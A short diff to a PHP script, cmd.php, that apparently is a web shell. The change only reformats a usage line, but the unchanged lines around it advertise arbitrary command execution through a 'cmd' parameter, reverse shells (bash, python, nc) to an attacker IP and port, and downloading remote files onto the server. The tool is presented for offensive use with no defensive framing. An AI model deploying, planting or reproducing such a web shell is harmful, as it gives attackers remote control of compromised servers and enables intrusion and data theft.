@@ -6,7 +6,7 @@ header('Content-Type: text/plain');
 // Display usage instructions
 echo "// Author: Yavuz Sahbaz\n\n";
 echo "// GitHub: https://github.com/YavuzSahbaz\n\n";
-echo "Usage: NOTE ::!!!! SOMETIME IT WORK WITH '?' OR '&' IF PAGE NOT RESPONSE CHECK WITH '?'  cmd.php&cmd=[COMMAND]\n";
+echo "Usage: NOTE ::!!!! SOMETIME IT WORK WITH '?' OR '&' IF PAGE NOT RESPONSE CHECK WITH '?'\n  cmd.php&cmd=[COMMAND]\n";
 echo "For reverse shell: cmd.php&revshell=[revshell_type]:[ATTACKER_IP]:[ATTACKER_PORT]\n";
 echo "Supported reverse shell types: bash, python, python3, nc\n";
 echo "For downloading a file: cmd.php&download=[URL]&filename=[FILENAME]\n";
